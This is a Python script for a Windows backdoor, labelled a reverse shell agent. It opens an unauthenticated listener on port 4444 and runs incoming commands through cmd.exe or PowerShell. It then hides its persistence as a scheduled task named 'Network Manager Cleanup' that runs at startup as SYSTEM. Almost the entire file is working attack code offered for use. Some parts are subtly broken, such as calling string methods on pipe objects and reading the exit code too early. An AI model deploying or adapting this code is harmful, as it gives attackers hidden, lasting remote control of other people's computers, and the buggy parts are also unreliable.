#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Windows Reverse Shell Agent

FEATURES:
 1. Reverse TCP listener (Port 4444 default)
 2. Pipes input to cmd.exe or PowerShell
 3. Smart Prompt: Returns user@hostname - folderpath after each command
 4. Task Scheduler persistence (ONSTART) to survive reboot
 5. Lifecycle Manager: Keeps listener alive after shell closure
"""

import socket
import threading
import sys
import os
import argparse
import time
import datetime
import subprocess
from subprocess import Popen, PIPE

# === CONFIGURATION ===
LISTENER_HOST = "0.0.0.0"
DEFAULT_PORT = 4444
DEFAULT_TASK_NAME = "Network Manager Cleanup"
DEFAULT_TASK_RUN_AS = "SYSTEM"
DEFAULT_TASK_TRIGGER = "ONSTART"

# === PROMPT CONFIGURATION ===
# Format: user@hostname - folderpath >
PROMPT_TEMPLATE = "{user}@{hostname} - {folder}>"
PROMPT_PREFIX = PROMPT_TEMPLATE  # Keep this reference

# === LIFECYCLE MANAGER ===
class LifecycleManager:
    def __init__(self):
        self.running = True

    def keep_alive(self):
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False

    def on_exit(self):
        self.running = False

# === SOCKET HANDLER (Multi-Threaded, Persistent) ===
class SocketHandler:
    def __init__(self, host, port, command_type):
        self.host = host
        self.port = port
        self.command_type = command_type
        self.socket = None

    def start(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((self.host, self.port))
        self.socket.listen(5)
        print(f"[+] Listener Started on {self.host}:{self.port}")
        print(f"[+] Mode: {self.command_type}")
        print(f"[+] Waiting for connection...")

        # Main Loop for the Listener
        while True:
            try:
                client_sock, addr = self.socket.accept()
                print(f"[*] Connected: {addr}")
                # Start a new thread for every client connection
                threading.Thread(target=self.process_connection, args=(client_sock, addr)).start()
            except Exception as e:
                print(f"Error accepting connection: {e}")
                time.sleep(1)
                continue

    def process_connection(self, client_sock, addr):
        try:
            while True:
                msg = client_sock.recv(4096).decode('utf-8').strip()
                if not msg:
                    break
                clean_cmd = msg.strip('"\'')
                output = self.execute_shell(clean_cmd)
                client_sock.sendall(output.encode('utf-8'))
        except Exception as e:
            print(f"[!] Error reading from {addr}: {e}")
        finally:
            try:
                client_sock.close()
            except:
                pass

    def execute_shell(self, cmd):
        if not cmd:
            return self._get_shell_prompt()

        executable = "powershell.exe" if self.command_type == "powershell" else "cmd.exe"
        shell_cmd = executable + " /c " + cmd

        try:
            proc = Popen(shell_cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, text=True)

            output = ""
            try:
                if proc.stdout:
                    output = proc.stdout.read()
                if proc.stderr:
                    err = proc.stderr.read()
                    if err:
                        output = output + "\n[Error]: " + err
            except:
                pass

            exit_code = proc.returncode
            proc.wait()

            # === SMART PROMPT INJECTION ===
            # Inject user@hostname - folderpath prompt after command output
            try:
                user, hostname, folder = self._get_shell_prompt()
                prompt = PROMPT_TEMPLATE.format(user=user, hostname=hostname, folder=folder)
                if output:
                    output = output.rstrip() + "\n\n" + prompt
                else:
                    output = prompt
            except:
                output = self._get_shell_prompt_fallback()

            return f"exit_code:{exit_code}\n{output}"
        except Exception as e:
            return f"Exception: {e}"

    def _get_shell_prompt(self):
        """Get current user, hostname, and folder for prompt display."""
        try:
            if self.command_type == "powershell":
                # PowerShell: Get user, hostname, and location
                ps_cmd = 'powershell.exe -c "$env:USERNAME; $env:COMPUTERNAME; Get-Location"'
                proc = Popen(ps_cmd, shell=True, stdout=PIPE, stderr=PIPE, text=True)
                lines = proc.stdout.strip().splitlines()
                if len(lines) >= 3:
                    return lines[0], lines[1], lines[2]
                return ["User", "Hostname", "root"]
            else:
                # CMD: Get user, hostname, and folder
                cmd_cmd = 'cmd.exe /c "echo %USERNAME%; echo %COMPUTERNAME%; cd"'
                proc = Popen(cmd_cmd, shell=True, stdout=PIPE, stderr=PIPE, text=True)
                lines = proc.stdout.strip().splitlines()
                if len(lines) >= 3:
                    return lines[0], lines[1], lines[2]
                return ["User", "Hostname", "root"]
        except:
            return ["User", "Hostname", "root"]

    def _get_shell_prompt_fallback(self):
        """Fallback to safe defaults if shell detection fails."""
        try:
            user, _, _ = self._get_shell_prompt()
            folder = os.getcwd()
            return [user, os.popen("hostname -s").read().strip(), folder]
        except:
            return ["User", "Hostname", "root"]

# === PERSISTENCE MANAGER (Fixed Path Detection + Command) ===
class PersistenceManager:
    @staticmethod
    def create_task(script_path, task_name, run_as="SYSTEM", trigger="ONSTART"):
        print(f"[*] Configuring Persistence via Task Scheduler...")

        # === FIXED: Try Multiple Paths for schtasks ===
        schtasks_paths = [
            "schtasks.exe",  # Check current path first
            os.path.join(os.environ.get("WINDIR", "C:\\Windows"), "System32", "schtasks.exe"),
            os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "schtasks.exe"),
            os.path.join(os.environ.get("SystemDrive", "C:\\"), "Windows", "System32", "schtasks.exe"),
        ]

        schtasks_exe = None
        for path in schtasks_paths:
            if os.path.exists(path):
                schtasks_exe = path
                print(f"[+] Found schtasks at: {path}")
                break
        else:
            print("[!] Warning: schtasks.exe not found in default paths")
            return

        if not schtasks_exe:
            print("[!] Warning: schtasks.exe not found in any standard path")
            return

        # === FIXED: Build command based on trigger ===
        # ONSTART/ONLOGON don't use /ST or /SD (Start/StartDelay)
        if trigger in ["ONSTART", "ONLOGON", "ONIDLE", "ONEVENT"]:
            # These triggers don't need /ST or /SD
            command = f'{schtasks_exe} /Create /TN "{task_name}" /TR "python {script_path}" /RU "{run_as}" /SC {trigger} /F'
        else:
            # Default (ONMINUTE, ONHOURLY, ONCE, etc.) - can use /ST
            command = f'{schtasks_exe} /Create /TN "{task_name}" /TR "python {script_path}" /RU "{run_as}" /SC ONSTART /ST 00:00 /F'

        try:
            print(f"[*] Running Command: {command}")
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)

            if result.returncode == 0:
                print(f"[+] Task Created/Updated: {task_name}")
                print(f"[+] Running As: {run_as}")
                print(f"[+] Trigger: {trigger}")
            else:
                print(f"[!] Error creating task. Output: {result.stderr}")
        except subprocess.TimeoutExpired:
            print("[!] Task creation timed out (max 30 seconds)")
        except Exception as e:
            print(f"[!] Exception while creating task: {e}")

# === MAIN ENTRY POINT ===
def get_script_path():
    return os.path.abspath(sys.argv[0])

def main():
    # Add CLI arguments for customizability
    parser = argparse.ArgumentParser(description="Reverse Shell Persistence Agent")
    parser.add_argument('--mode', type=str, default='cmd', choices=['cmd', 'powershell'],
                       help='Shell mode (Default: cmd)')
    parser.add_argument('--port', type=int, default=DEFAULT_PORT,
                       help='Listening port (Default: 4444)')
    parser.add_argument('--install', action='store_true',
                       help='Force install persistence (Default: True)')
    args = parser.parse_args()

    print("="*30)
    print("WINDOWS REVERSE SHELL AGENT")
    print("="*30)

    script_path = get_script_path()
    print(f"[*] Script Executing From: {script_path}")

    # === 1. Setup Socket Listener ===
    listener = SocketHandler(LISTENER_HOST, args.port, args.mode)

    # === 2. Setup Persistence (Create Task) ===
    if args.install:
        PersistenceManager.create_task(script_path, DEFAULT_TASK_NAME, DEFAULT_TASK_RUN_AS, DEFAULT_TASK_TRIGGER)
        time.sleep(2)

    # === 3. Start Listener Thread (Daemonized) ===
    listener_thread = threading.Thread(target=listener.start)
    listener_thread.daemon = True
    listener_thread.start()

    print("[+] Agent Initialized.")
    print("[+] Main thread will keep running to monitor exit codes.")

    # === 4. Lifecycle Manager ===
    lifecycle = LifecycleManager()

    # Keep main thread alive for listener
    try:
        while lifecycle.running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[*] Graceful Shutdown...")
        lifecycle.running = False
        listener.socket.close()
    except Exception as e:
        print(f"[!] Fatal Error: {e}")
        lifecycle.running = False
        listener.socket.close()

if __name__ == "__main__":
    main()
